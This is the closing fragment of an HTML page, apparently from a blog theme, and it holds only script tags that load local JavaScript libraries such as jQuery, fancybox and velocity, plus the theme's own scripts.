    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
